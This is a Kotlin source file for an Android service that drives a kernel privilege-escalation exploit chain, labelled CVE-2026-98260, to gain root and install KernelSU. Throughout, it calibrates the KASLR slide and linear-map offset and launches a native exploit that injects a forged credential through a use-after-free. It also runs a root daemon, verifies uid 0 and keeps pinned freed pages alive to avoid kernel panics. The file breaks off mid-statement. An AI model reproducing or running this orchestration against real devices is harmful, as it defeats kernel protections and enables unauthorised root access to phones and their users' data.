package com.GhostKey.app.shizuku

import android.content.Context
import android.os.Process
import android.util.Log
import com.GhostKey.app.device.PrivilegeGate
import com.GhostKey.app.ksu.KsudStage
import com.GhostKey.app.native.NativeContract
import com.GhostKey.app.native.NativeContract.Stage
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.RandomAccessFile
import java.lang.Process as JavaProcess
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Shizuku 用户服务：承载完整的 CVE-2026-98260 利用链路。
 *
 * 链路严格对齐 PC 参考实现 run.py：
 *   [1/9] 检测设备（宿主 ExploitEngine 已做）
 *   [2/9] 匹配内核条目（宿主已做，blob 经 AIDL 传入）
 *   [3/9] 编译（APK 预编译）
 *   [4/9] 推送（原生体已在 APK 内，ksud 从 assets 解压）
 *   [5/9] 校准：calibrate-a(slide) -> calibrate-b(page_offset)
 *   [6/9] 等待负载降低
 *   [7/9] 注入：exploit --slide .. --page-offset ..
 *   [8/9] 验证：su -c id => uid=0(root)
 *   [9/9] KSU 接管：经 rootd(uid=0) 执行 late-load
 */
class Cve98260UserService(private val context: Context) : ICve98260UserService.Stub() {

    private val running = AtomicBoolean(false)

    @Volatile private var exploitProcess: JavaProcess? = null

    /** 本轮 rootd 的 socket 路径（每轮唯一，经 PC98260_SOCK 传给原生体） */
    @Volatile private var socketPath: String = ROOT_SOCK

    /** 本轮 rootd 的 stop 文件路径（每轮唯一，经 PC98260_STOP_FILE 传给原生体） */
    @Volatile private var stopFilePath: String = File(WORK_DIR, "rootd.stop").absolutePath

    companion object {
        private const val TAG = "Cve98260UserService"
        private const val STATUS_MARKER = NativeContract.STATUS_MARKER
        private const val WORK_DIR = "/data/local/tmp/cve98260-app"

        /** 与 pc98260_rootd.c 的 ROOT_SOCK 默认值一致（仅作回退/清理旧文件用） */
        private const val ROOT_SOCK = "/data/local/tmp/pc98260-root.sock"
        private const val ROOTD_MARKER = "C98260_ROOTD_READY=1"

        /**
         * E4：日志尾扫上限。旧实现只扫末 32KB，若就绪/失败标记写入较早、其后日志
         * 超过 32KB 就会漏判。日志文件每轮开始时被截断（见 runChain 的 writeText("")），
         * 因此从头扫描不会命中上一轮残留；上限仅用于兜住异常超大日志。
         */
        private const val TAIL_SCAN_MAX = 4 * 1024 * 1024

        private const val CALIB_A_TIMEOUT_SEC = 180L
        private const val CALIB_B_TIMEOUT_SEC = 240L
        private const val INJECT_TIMEOUT_SEC = 300L
        private const val VERIFY_TIMEOUT_SEC = 30L
        private const val KSU_TIMEOUT_SEC = 180L

        /**
         * 一个子步骤超时的返回码（区别于正常的非 0 退出码）。
         *
         * 超时时**不杀进程**，只返回这个值：该类进程可能已经 fork 出钉住受害页的
         * AIO holder 子进程，SIGKILL 会让 pin 塌陷并 panic（见 [4] 段注释）。
         */
        private const val RC_STEP_TIMEOUT = -9

        /** 安全退场：等待 rootd 优雅退出的超时 */
        private const val ROOTD_STOP_TIMEOUT_SEC = 30L

        /** 安全退场：等待 exploit 父进程退出的超时 */
        private const val EXPLOIT_EXIT_TIMEOUT_SEC = 20L

        private const val RESULT_SLIDE = "slide.txt"
        private const val RESULT_PAGE_OFFSET = "page_offset.txt"
        private const val RESULT_PAGE_OFFSET_SCORE = "page_offset.score"

        private val HEX_RE = Regex("^0x[0-9a-fA-F]+$")

        private fun stageIndex(stage: String): Int = NativeContract.Stage.indexOf(stage)
    }

    override fun executeExploit(
        profileBlob: ByteArray?,
        managerPackage: String?,
        managerKsudPath: String?,
        callback: ICve98260Callback?,
    ) {
        if (!running.compareAndSet(false, true)) {
            callback?.onLog("<s> error: another exploit process is already running")
            callback?.onComplete(1)
            return
        }

        Thread({
            val code = try {
                runChain(profileBlob, managerPackage.orEmpty(), managerKsudPath.orEmpty(), callback)
            } catch (e: Exception) {
                Log.e(TAG, "execution failed", e)
                runCatching { callback?.onLog("<s> error: ${e.message}") }
                1
            }
            runCatching { callback?.onComplete(code) }
            running.set(false)
        }, "c98260-runner").start()
    }


    private fun runChain(
        profileBlob: ByteArray?,
        managerPackage: String,
        managerKsudPath: String,
        callback: ICve98260Callback?,
    ): Int {
        val gate = PrivilegeGate.checkService()
        require(gate.ok) { "not shell/root uid (${gate.uid})" }
        val self = File("/proc/self/status").readText()
        require(Regex("(?m)^Seccomp:\\s*0$").containsMatchIn(self)) {
            "seccomp not disabled (Shizuku UserService filtered)"
        }
        callback?.onLog("<s> Shizuku ready: uid=${gate.uid} seccomp=0")

        val nativeLib = File(context.applicationInfo.nativeLibraryDir, "libcve98260.so")
        require(nativeLib.isFile) { "native binary missing: ${nativeLib.absolutePath}" }

        val workDir = File(WORK_DIR).apply {
            require(isDirectory || mkdirs()) { "failed to create work dir: $absolutePath" }
        }
        val logFile = File(workDir, ".cve98260_native.log").apply { writeText("") }
        val roundId = System.currentTimeMillis()
        socketPath = File(workDir, "root-$roundId.sock").absolutePath
        stopFilePath = File(workDir, "root-$roundId.stop").absolutePath
        File(workDir, RESULT_SLIDE).delete()
        File(workDir, RESULT_PAGE_OFFSET).delete()
        File(workDir, RESULT_PAGE_OFFSET_SCORE).delete()

        val ksud = resolveKsud(workDir, managerPackage, managerKsudPath, callback)
        if (ksud != null) callback?.onLog("<s> ksud: ${ksud.absolutePath}")
        else callback?.onLog("<s> warn: ksud not available, KSU takeover will be skipped")

        val env = baseEnv(workDir, ksud)

        val tailer = Thread({ relayLog(logFile, callback) }, "c98260-tailer").apply {
            isDaemon = true
            start()
        }

        try {
            //
            //
            //
            //
            val stale = residualNativePids()
            if (stale.isNotEmpty()) return resolveResidual(stale, workDir, env, callback)
            callback?.onLog("<b> cleaning up stale sockets and stop files")
            val staleFailed = cleanupStale(workDir)
            if (staleFailed > 0) {
                callback?.onLog(
                    "<s> stale cleanup: $staleFailed node(s) still present " +
                        "(unlink denied while SELinux is Enforcing)",
                )
            }

            callback?.onProgress(stageIndex(Stage.CALIB_A), "running")
            val rcA = runStep(
                listOf(nativeLib.absolutePath, "calibrate-a"),
                workDir, env, logFile, profileBlob, CALIB_A_TIMEOUT_SEC,
            )
            val slide = readResult(workDir, RESULT_SLIDE)
            if (slide == null) {
                callback?.onLog("<s> error: calib_a failed to solve KASLR slide (rc=$rcA), abort")
                callback?.onProgress(stageIndex(Stage.CALIB_A), "failed")
                return 2
            }
            callback?.onLog("<b> KASLR slide = $slide")
            callback?.onProgress(stageIndex(Stage.CALIB_A), "ok")

            callback?.onProgress(stageIndex(Stage.CALIB_B), "running")
            val rcB = runStep(
                listOf(nativeLib.absolutePath, "calibrate-b", "--slide", slide),
                workDir, env, logFile, profileBlob, CALIB_B_TIMEOUT_SEC,
            )
            val pageOffset = readResult(workDir, RESULT_PAGE_OFFSET)
            if (pageOffset == null) {
                callback?.onLog("<s> error: calib_b failed to solve page_offset (rc=$rcB), abort")
                callback?.onProgress(stageIndex(Stage.CALIB_B), "failed")
                return 3
            }
            val score = runCatching {
                File(workDir, RESULT_PAGE_OFFSET_SCORE).readText().trim()
            }.getOrDefault("?")
            callback?.onLog("<b> linear map base = $pageOffset (confidence $score)")
            if (score == "fallback") {
                callback?.onLog("<s> warn: page_offset not verified, fell back to profile default")
            }
            callback?.onProgress(
                stageIndex(Stage.CALIB_B),
                if (score == "fallback") "degraded" else "ok",
            )

            waitIdle()

            callback?.onProgress(stageIndex(Stage.INJECT), "running")
            val proc = startProcess(
                listOf(
                    nativeLib.absolutePath, "exploit",
                    "--slide", slide,
                    "--page-offset", pageOffset,
                    "--daemon-exit",
                ),
                workDir, env, logFile, profileBlob,
            )
            exploitProcess = proc
            recordOomScoreAdj(processPid(proc), callback)
            callback?.onLog("<b> injection started (pid held by native), waiting for rootd...")

            if (!waitForRootd(logFile, INJECT_TIMEOUT_SEC * 1000)) {
                callback?.onLog("<s> error: rootd not ready in time, injection failed")
                callback?.onProgress(stageIndex(Stage.INJECT), "failed")
                return 4
            }
            callback?.onProgress(stageIndex(Stage.INJECT), "ok")
            callback?.onLog("<s> rootd ready, temporary root channel established")

            if (!verifyTemporaryRoot(nativeLib, workDir, env, callback)) {
                callback?.onProgress(stageIndex(Stage.VERIFY), "failed")
                return 5
            }

            val ksuLive = if (ksud == null) {
                callback?.onProgress(stageIndex(Stage.KSU), "skipped")
                callback?.onLog("<s> skip KSU takeover (no ksud)")
                false
            } else {
                ksuTakeover(nativeLib, workDir, env, logFile, profileBlob, ksud, callback)
            }

            //
            //
            if (ksuLive) {
                callback?.onLog("<b> KernelSU provides the real root channel")
                callback?.onLog(
                    "<s> native daemon (page holder + rootd) stays resident by design, " +
                        "same as the PC reference implementation",
                )
            } else {
                callback?.onLog(
                    "<s> warn: KSU takeover not confirmed, " +
                        "keeping temporary root channel (exploit process stays alive)",
                )
            }
            return 0
        } finally {
            tailer.interrupt()
            runCatching { tailer.join(800) }
        }
    }

    /**
     * R1：[4] 段的残留进程处置决策（从 [runChain] 抽出，仅搬家不改行为）。
     *
     * 返回本轮应直接结束的退出码：
     *   0 = 残留存在但 KernelSU 已是活跃 root 提供方 → 复用现有 root，跳过重新注入；
     *   8 = 残留存在且没有任何可用 root → 中止本轮，要求重启后再跑。
     * 调用点仅在 stale 非空时进入，因此必然终结本轮。
     */
    private fun resolveResidual(
        stale: List<Int>,
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ): Int {
        if (ksuRootLive(workDir, env)) {
            callback?.onLog(
                "<s> detected residual native process(es) " +
                    "[${stale.joinToString(",")}] but KernelSU already provides root",
            )
            callback?.onLog("<b> reusing existing KernelSU root; skipping re-exploitation")
            return 0
        }
        callback?.onLog(
            "<s> error: previous round left native process(es) [${stale.joinToString(",")}]",
        )
        callback?.onLog(
            "<s> error: they still pin the pages holding the injected cred " +
                "(the set includes the AIO holder children from hold_aio_children)",
        )
        callback?.onLog(
            "<s> error: killing them would drop that pin and panic the kernel, " +
                "so this round is aborted instead of cleared",
        )
        callback?.onLog("<s> reboot the device, then run the pipeline again")
        return 8
    }

    /**
     * R1：[8] 段 root 验证（从 [runChain] 抽出，仅搬家不改行为）。
     *
     * rootd 虽已打印就绪，但 accept 队列/凭据落位仍可能有毫秒级延迟，单次失败
     * 就判死会把「差 200ms」误报成「提权失败」，故重试若干次。
     */
    private fun verifyTemporaryRoot(
        nativeLib: File,
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ): Boolean {
        callback?.onProgress(stageIndex(Stage.VERIFY), "running")
        var idOut = ""
        for (attempt in 1..8) {
            idOut = runCapture(
                listOf(nativeLib.absolutePath, "su", "-c", "id"),
                workDir, env, VERIFY_TIMEOUT_SEC,
            ).trim()
            if (idOut.contains("uid=0(root)")) break
            if (attempt == 1) {
                callback?.onLog("<s> first verify failed: ${idOut.ifEmpty { "<empty>" }}, retrying")
            }
            Thread.sleep(1500)
        }
        callback?.onLog("<b> su -c id => ${idOut.ifEmpty { "<empty>" }}")
        if (!idOut.contains("uid=0(root)")) {
            callback?.onLog("<s> error: temporary root verify failed (socket=$socketPath)")
            return false
        }
        callback?.onProgress(stageIndex(Stage.VERIFY), "ok")
        callback?.onLog("<s> temporary root verified")
        return true
    }

    /**
     * R1：[9] 段 KernelSU 接管（从 [runChain] 抽出，仅搬家不改行为）。
     * 返回 KSU 是否已经成为可用的正规 root 通道。
     */
    private fun ksuTakeover(
        nativeLib: File,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        profileBlob: ByteArray?,
        ksud: File,
        callback: ICve98260Callback?,
    ): Boolean {
        callback?.onProgress(stageIndex(Stage.KSU), "running")
        val rcK = runStep(
            listOf(nativeLib.absolutePath, "ksu-takeover"),
            workDir, env, logFile, profileBlob, KSU_TIMEOUT_SEC,
        )
        val moduleLive = modulesHasKernelsu()
        val probe0 = suProbe(workDir, env)
        var independentSu = suWorks(probe0)
        callback?.onLog("<s> independent su => ${probe0.ifEmpty { "<empty>" }}")
        if (moduleLive) {
            startKsudDaemon(ksud, workDir, env, callback)
            val probe1 = suProbe(workDir, env)
            if (!independentSu && suWorks(probe1)) {
                independentSu = true
                callback?.onLog("<b> su became available after ksud daemon start")
            }
            if (probe1.isNotEmpty() && probe1 != probe0) {
                callback?.onLog("<s> independent su (after daemon) => $probe1")
            }
        }
        val ksuLive = moduleLive || independentSu
        callback?.onProgress(stageIndex(Stage.KSU), if (ksuLive) "ok" else "failed")
        callback?.onLog(
            if (ksuLive) {
                "<s> KernelSU ready (module=$moduleLive, independent su=$independentSu)"
            } else {
                "<s> warn: KernelSU not loaded (rc=$rcK, see ${workDir}/ksu_takeover.log)"
            },
        )
        return ksuLive
    }


    private fun baseEnv(workDir: File, ksud: File?): Map<String, String> =
        buildMap {
            put("CVE98260_HOME", workDir.absolutePath)
            put("TMPDIR", workDir.absolutePath)
            put("HOME", workDir.absolutePath)
            put("PATH", "/system/bin:/vendor/bin:/data/local/tmp")
            put("PLANT_FAST", "1")
            put("PC98260_SOCK", socketPath)
            put("PC98260_STOP_FILE", stopFilePath)
            ksud?.let { put("CVE98260_KSUD", it.absolutePath) }
            put("CVE98260_KSU_LOG", File(workDir, "ksu_takeover.log").absolutePath)
        }

    private fun applyEnv(pb: ProcessBuilder, env: Map<String, String>) {
        pb.environment().putAll(env)
    }

    private fun writeBlob(stream: java.io.OutputStream, blob: ByteArray?) {
        if (blob == null || blob.isEmpty()) return
        val len = blob.size
        stream.write(
            byteArrayOf(
                (len ushr 24).toByte(),
                (len ushr 16).toByte(),
                (len ushr 8).toByte(),
                len.toByte(),
            ),
        )
        stream.write(blob)
        stream.flush()
    }

    /** 跑完一个子命令（输出追加到统一日志，由 tailer 转发）。 */
    private fun runStep(
        cmd: List<String>,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        blob: ByteArray?,
        timeoutSec: Long,
    ): Int {
        val pb = ProcessBuilder(cmd)
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.appendTo(logFile))
        applyEnv(pb, env)
        val p = pb.start()
        runCatching { writeBlob(p.outputStream, blob) }
        return if (p.waitFor(timeoutSec, TimeUnit.SECONDS)) p.exitValue() else {
            val label = cmd.firstOrNull() ?: "step"
            Log.w(TAG, "step timed out after ${timeoutSec}s, left alive: $cmd")
            runCatching {
                logFile.appendText(
                    "<s> warn: $label still running after ${timeoutSec}s; " +
                        "left it alive on purpose (killing native processes can drop the pin " +
                        "on the cred pages and panic the kernel)\n",
                )
            }
            RC_STEP_TIMEOUT
        }
    }

    /** 启动长驻子进程（exploit），不等待。 */
    private fun startProcess(
        cmd: List<String>,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        blob: ByteArray?,
    ): JavaProcess {
        val pb = ProcessBuilder(cmd)
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.appendTo(logFile))
        applyEnv(pb, env)
        val p = pb.start()
        runCatching { writeBlob(p.outputStream, blob) }
        return p
    }

    /** 跑一个子命令并取回它的输出（用于 su -c id 验证）。 */
    private fun runCapture(
        cmd: List<String>,
        workDir: File,
        env: Map<String, String>,
        timeoutSec: Long,
    ): String {
        val out = File(workDir, "verify.out").apply { delete() }
        val pb = ProcessBuilder(cmd)
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(out)
        applyEnv(pb, env)
        val p = pb.start()
        runCatching { p.outputStream.close() }
        if (!p.waitFor(timeoutSec, TimeUnit.SECONDS))
            Log.w(TAG, "capture timed out after ${timeoutSec}s, left alive: $cmd")
        return runCatching { out.readText() }.getOrDefault("")
    }


    /**
     * KSU 接管成功后的安全退场（safe release）。
     *
     * 背景：KSU 接管成功后，root 能力已由 KernelSU 提供，exploit 原生进程
     * （它持有被占住的页面，并 fork 出了 rootd）就没有继续驻留的必要。
     * 原生侧新增了 "rootd-stop" 子命令：它让 rootd 优雅退出并删除 socket 文件，
     * cred 子进程与 exploit 父进程随后会自行退出。
     *
     * 本函数整体是非致命的：任何异常都不能让已经成功的 KSU 接管变成整轮失败，
     * 因此全部包在 runCatching 里，失败只记日志。
     */
    private fun safeRelease(
        nativeLib: File,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        profileBlob: ByteArray?,
        ksud: File?,
        callback: ICve98260Callback?,
    ) {
        runCatching {
            val independentRoot = probeIndependentRoot(workDir, env, callback)

            val rc = runStep(
                listOf(nativeLib.absolutePath, "rootd-stop"),
                workDir, env, logFile, profileBlob, ROOTD_STOP_TIMEOUT_SEC,
            )
            if (rc == 0) {
                callback?.onLog("<b> rootd stop confirmed (rc=0)")
            } else {
                callback?.onLog("<s> warn: rootd stop not confirmed rc=$rc")
            }

            //
            //
            //
            //
            //
            val stillBorrowing = scanBorrowedCredHolders(workDir, env, independentRoot, ksud, callback)

            //
            val exited = if (rc == 0 && independentRoot && !stillBorrowing) {
                exploitProcess?.waitFor(EXPLOIT_EXIT_TIMEOUT_SEC, TimeUnit.SECONDS) == true
            } else {
                false
            }
            if (exited) {
                callback?.onLog("<b> exploit process exited, no residual libcve98260.so")
            } else {
                val why = when {
                    rc != 0 -> "rootd stop not confirmed"
                    !independentRoot -> "no independent root channel"
                    stillBorrowing -> "procs still on the borrowed cred"
                    else -> "exploit process still alive after ${EXPLOIT_EXIT_TIMEOUT_SEC}s"
                }
                callback?.onLog(
                    "<s> warn: native process stays resident ($why); " +
                        "leaving it alive is safer than freeing the borrowed cred",
                )
            }

            val residual = residualNativePids()
            callback?.onLog(
                "<s> residual check: ${residual.size} process(es) [${residual.joinToString(",")}]"
            )
            if (residual.isEmpty()) {
                callback?.onLog("<b> no residual libcve98260.so process, native retired")
            } else {
                callback?.onLog(
                    "<s> warn: native residue remains; borrowed cred page kept alive " +
                        "(safer than freeing it)"
                )
            }
        }.onFailure {
            Log.w(TAG, "safe release failed", it)
            runCatching { callback?.onLog("<s> warn: safe release failed: ${it.message}") }
        }
    }

    /**
     * R1：safeRelease (1) 段——探测「独立 root 通道」（从 [safeRelease] 抽出，仅搬家）。
     *
     * 判据：KSU 的 su 必须落在正规 KSU 域（u:r:ksu:s0）并拿到 uid=0，说明 root
     * 能力已由内核模块正规提供，不再依赖我们的临时通道。rootd 通道给出的 context
     * 是 u:object_r:unlabeled:s0（注入伪造 cred 的产物），据此可区分两条路径。
     */
    private fun probeIndependentRoot(
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ): Boolean {
        val suOut = runCatching {
            runCapture(
                listOf("/system/bin/sh", "-c", "su -c id"),
                workDir, env, VERIFY_TIMEOUT_SEC,
            ).trim()
        }.getOrDefault("")
        callback?.onLog("<s> evidence: independent su => ${suOut.ifEmpty { "<empty>" }}")
        val independentRoot = suOut.contains("uid=0(root)") &&
            suOut.contains("context=u:r:ksu:s0")
        if (independentRoot) {
            callback?.onLog("<b> independent root channel available (u:r:ksu:s0)")
        } else {
            callback?.onLog(
                "<s> warn: no independent root channel in a regular KSU domain; " +
                    "keeping native process resident",
            )
        }
        return independentRoot
    }

    /**
     * R1：safeRelease (3) 段——扫「仍持有伪造 cred」的进程（从 [safeRelease] 抽出）。
     *
     * 优先用 KSU 的 su 以 root 权限扫：shell 域读不到 uid 0 进程的
     * /proc/<pid>/attr/current 时会静默漏报，而漏报会导致错误放行退场。
     * 返回 true 表示仍有进程持有那份伪造 cred（此时绝不能释放页面）。
     */
    private fun scanBorrowedCredHolders(
        workDir: File,
        env: Map<String, String>,
        independentRoot: Boolean,
        ksud: File?,
        callback: ICve98260Callback?,
    ): Boolean {
        Thread.sleep(600)
        val borrowedHolders = if (independentRoot) {
            unlabeledDomainPidsViaRoot(workDir, env)
        } else {
            null
        }
        val holders = borrowedHolders ?: unlabeledDomainPidsDirect()
        if (borrowedHolders == null) {
            callback?.onLog(
                "<s> warn: unlabeled-domain scan ran without root; " +
                    "results may under-report (treated conservatively)",
            )
        }
        val allDaemons = ksud?.let { ksudDaemonPids(it) }.orEmpty()
        callback?.onLog(
            "<s> evidence: ksud daemons => ${allDaemons.joinToString(",").ifEmpty { "<none>" }} " +
                "; procs on borrowed cred => " +
                holders.joinToString(",").ifEmpty { "none" } +
                if (borrowedHolders != null) " (scanned as root)" else " (shell scan)",
        )
        val stillBorrowing = holders.isNotEmpty()
        if (stillBorrowing) {
            callback?.onLog(
                "<s> warn: ${holders.joinToString(",")} still holds the " +
                    "borrowed cred; not releasing the page (would panic the kernel). " +
                    "Native process stays resident.",
            )
        }
        return stillBorrowing
    }

    /** 扫 /proc 下所有数字目录的 cmdline，统计仍含 "libcve98260.so" 的进程（跳过自己）。 */
    private fun residualNativePids(): List<Int> {
        val self = Process.myPid()
        return runCatching {
            File("/proc").listFiles()
                ?.mapNotNull { it.name.toIntOrNull() }
                .orEmpty()
                .filter { it != self }
                .filter { pid ->
                    val cmdline = runCatching {
                        File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8)
                    }.getOrNull()
                    cmdline != null && cmdline.contains("libcve98260.so")
                }
        }.getOrDefault(emptyList())
    }

    /** 扫 /proc 找仍在运行的 ksud 守护进程。
     *
     *  只按 `ksud` 这个名字匹配，不绑死绝对路径：ksud 启动后可能 re-exec 到
     *  `/data/adb/ksud`（设备版），用 `/data/local/tmp/cve98260-app/ksud` 去精确
     *  匹配会漏检——真机 22:27 那轮就出现过「shell 起得来但 /proc 里找不到」，
     *  到底是没起来还是没认出来，旧实现无法区分。 */
    private fun ksudDaemonPids(ksud: File): List<Int> {
        val self = Process.myPid()
        return runCatching {
            File("/proc").listFiles()
                ?.mapNotNull { it.name.toIntOrNull() }
                .orEmpty()
                .filter { it != self }
                .filter { pid ->
                    val cmdline = runCatching {
                        File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8)
                    }.getOrNull() ?: return@filter false
                    cmdline.contains("ksud") &&
                        !cmdline.contains("ksu_takeover.sh") &&
                        !cmdline.contains("libcve98260") &&
                        !cmdline.contains("cve98260-app/ksud.log")
                }
        }.getOrDefault(emptyList())
    }

    /**
     * 判断某个进程持有的是"借来的伪造 cred"还是内核正规 cred。
     *
     * 判据用 SELinux 上下文：注入伪造 cred 的进程落在 unlabeled 域
     * （真机日志里 rootd 通道的 `context=u:object_r:unlabeled:s0` 即此特征），
     * 而持有正规 cred 的进程落在它自己的域里（如 KSU 的 u:r:ksu:s0）。
     *
     * 这是可验证的证据，不是猜测——父进程释放被 UAF 回收的页之前，必须确认
     * 没有进程还停留在 unlabeled 域持有那份伪造 cred。
     *
     * 读取失败时一律按"持有伪造 cred"处理：读不到就无法证明安全，而放行退场
     * 的代价是 kernel panic。失败必须偏向保守的一侧。
     */
    private fun holdsBorrowedCred(pid: Int): Boolean =
        runCatching {
            val ctx = File("/proc/$pid/attr/current").readText().trim()
            ctx.isNotEmpty() && ctx.contains("unlabeled")
        }.getOrDefault(true)

    /** 仍在持有伪造 cred 的 ksud 守护 pid 列表。 */
    private fun ksudOnBorrowedCred(ksud: File): List<Int> =
        ksudDaemonPids(ksud).filter { holdsBorrowedCred(it) }

    /**
     * 扫出所有落在 unlabeled 域的进程 pid —— 这些进程持有的都是注入的伪造 cred。
     *
     * 范围不限于 ksud：rootd、cred 子进程、以及 rootd fork 出的任何 uid=0 命令
     * 都算。父进程释放被 UAF 回收的页之前，必须确认这个集合为空。
     *
     * 判据与 holdsBorrowedCred 一致（同一个 SELinux 上下文特征），避免两套
     * 判据出现分歧。
     */
    private fun unlabeledDomainPidsDirect(): List<Int> {
        val self = Process.myPid()
        return runCatching {
            File("/proc").listFiles()
                ?.mapNotNull { it.name.toIntOrNull() }
                .orEmpty()
                .filter { it != self }
                .filter { pid ->
                    val ctx = runCatching {
                        File("/proc/$pid/attr/current").readText().trim()
                    }.getOrNull()
                    ctx != null && ctx.contains("unlabeled")
                }
        }.getOrDefault(emptyList())
    }

    /**
     * 用 KSU 的 su（uid 0）扫 unlabeled 域进程 —— **权威判据**，返回 null 表示扫描不可用。
     *
     * 为什么必须用 root 扫：宿主进程跑在 shell(2000) 域，读 /proc/<uid0>/attr/current
     * 可能被 SELinux 拒绝。旧的直接扫描把"读不到"静默丢掉（getOrNull + null 过滤），
     * 于是会出现「procs on borrowed cred => none」而 cred 子进程其实还活着的假阴性
     * ——真机 21:45 日志已复现：`[cred] waiting for child 24230 (alive=1) 25 s`
     * 与 `procs on borrowed cred => none` 同时出现。
     *
     * 假阴性的代价是放行退场 → 释放被 UAF 回收的页 → kernel panic，
     * 所以只要 root 通道可用，就必须走这条路径，不能退回 shell 扫描。
     *
     * 用 SCAN_DONE 标记区分「扫完确实为空」与「su 根本没跑起来」：只有看到标记才认结果。
     */
    private fun unlabeledDomainPidsViaRoot(
        workDir: File,
        env: Map<String, String>,
    ): List<Int>? = runCatching {
        val script = File(workDir, "scan-unlabeled.sh")
        script.writeText(
            """
            for d in /proc/[0-9]*; do
              c=${'$'}(cat ${'$'}d/attr/current 2>/dev/null) || continue
              case "${'$'}c" in
                *unlabeled*) echo "U ${'$'}{d#/proc/}" ;;
              esac
            done
            echo SCAN_DONE
            """.trimIndent() + "\n",
        )
        script.setReadable(true, false)
        val out = runCapture(
            listOf("/system/bin/sh", "-c", "su -c 'sh ${script.absolutePath}'"),
            workDir, env, VERIFY_TIMEOUT_SEC,
        )
        if (!out.contains("SCAN_DONE")) {
            null
        } else {
            out.lineSequence()
                .map { it.trim() }
                .filter { it.startsWith("U ") }
                .mapNotNull { it.removePrefix("U ").trim().toIntOrNull() }
                .distinct()
                .toList()
        }
    }.getOrNull()


    /** 跑一次 `su -c id` 并返回原始输出；失败返回空串。 */
    private fun suProbe(workDir: File, env: Map<String, String>): String =
        runCatching {
            runCapture(
                listOf("/system/bin/sh", "-c", "su -c id"),
                workDir, env, VERIFY_TIMEOUT_SEC,
            )
        }.getOrDefault("").trim()

    /**
     * 判据：要么拿到 uid=0(root)，要么上下文落在 KSU 自己的域。
     * KSU 的 su 在某些版本上只回 context 不回 uid，两者取其一即可。
     */
    private fun suWorks(probe: String): Boolean =
        probe.contains("uid=0(root)") || probe.contains("context=u:r:ksu:s0")

    private fun suWorks(workDir: File, env: Map<String, String>): Boolean =
        suWorks(suProbe(workDir, env))

    /**
     * 判据：KernelSU 是否已经是活跃的 root 提供方（方法二 · 2026-10-28）。
     *
     * 通过 `su -c id` 同时拿到 `uid=0(root)` 与 KSU 自己的 SELinux 域
     * (`context=u:r:ksu:s0`) 来确认：root 由内核模块正规授予，而非本进程的临时
     * rootd 通道（unlabeled 域）。用于在「上一轮残留进程」护栏前做短路——既然内核
     * 已稳定提供 root，就不必再对已被钉住的页二次注入（会徒增 panic 风险）。
     *
     * 与 safeRelease 的 independentRoot 判据保持一致（两者皆需 uid + ksu 域）。
     */
    private fun ksuRootLive(workDir: File, env: Map<String, String>): Boolean {
        val probe = suProbe(workDir, env)
        return probe.contains("uid=0(root)") && probe.contains("context=u:r:ksu:s0")
    }

    /** 取 JavaProcess 的 pid：API 33+ 有 Process.pid()，更低版本走实现类私有字段。 */
    private fun processPid(proc: JavaProcess): Int? = runCatching {
        proc.javaClass.getMethod("pid").invoke(proc) as? Int
    }.recoverCatching {
        proc.javaClass.getDeclaredField("pid")
            .apply { isAccessible = true }
            .get(proc) as? Int
    }.getOrNull()

    /**
     * 由宿主（shell, uid 2000）启动 ksud 守护，与 PC 参考实现 run.py:572 一致：
     * `nohup /data/local/tmp/ksud >/dev/null 2>&1 &`。
     *
     * 关键点：**绝不能在 rootd 内启动**。rootd 以 uid 0 + 注入的伪造 cred 运行
     * （SELinux u:object_r:unlabeled:s0），在它里面起的守护会继承那份 cred；
     * 而那份 cred 躺在内核已释放的页里，守护从此不可杀、且任何页回收都会踩空。
     * PC 端从头到尾都是让 adb shell 去起 ksud，所以它的守护是正常 cred。
     */
    private fun startKsudDaemon(
        ksud: File?,
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ) {
        if (ksud == null) {
            callback?.onLog("<s> warn: ksud path unknown, daemon not started")
            return
        }
        if (ksudDaemonPids(ksud).isNotEmpty()) {
            callback?.onLog("<s> ksud daemon already running")
            return
        }
        val ksudLog = File(workDir, "ksud.log")
        val started = runCatching {
            val pb = ProcessBuilder(
                "/system/bin/sh", "-c",
                "nohup ${ksud.absolutePath} > ${ksudLog.absolutePath} 2>&1 &",
            )
            pb.directory(workDir)
            applyEnv(pb, env)
            pb.redirectErrorStream(true)
            pb.start()
            true
        }.getOrDefault(false)
        Thread.sleep(1000)
        val pids = ksudDaemonPids(ksud)
        callback?.onLog(
            when {
                pids.isNotEmpty() ->
                    "<b> ksud daemon started with normal shell cred (pid=${pids.joinToString(",")})"
                started -> {
                    val tail = runCatching {
                        ksudLog.readLines().filter { it.isNotBlank() }.takeLast(3)
                            .joinToString(" | ")
                    }.getOrDefault("")
                    "<s> warn: ksud daemon not visible in /proc" +
                        (if (tail.isNotEmpty()) "; ksud said: $tail"
                         else "; ksud.log is empty (it exited before printing anything)")
                }
                else ->
                    "<s> warn: failed to spawn ksud daemon"
            },
        )
    }

    /**
     * best-effort 把 exploit 父进程的 oom_score_adj 调到 -1000。
     *
     * 父进程持有被占住的页面；一旦被 LMK 或厂商冻结机制回收，页面释放而
     * ksud 仍引用悬空 cred，数分钟后就会 panic（自动重启）。
     *
     * 注入的 cred 只改了 uid/gid、没有提升 capabilities，所以这里很可能被
     * EACCES 拒绝——只回读并记录，绝不影响主链路。
     */
    private fun recordOomScoreAdj(pid: Int?, callback: ICve98260Callback?) {
        if (pid == null) {
            callback?.onLog("<s> oom_score_adj: pid unknown, skipped")
            return
        }
        val f = File("/proc/$pid/oom_score_adj")
        val ok = runCatching { f.writeText("-1000") }.isSuccess
        val now = runCatching { f.readText().trim() }.getOrDefault("?")
        callback?.onLog(
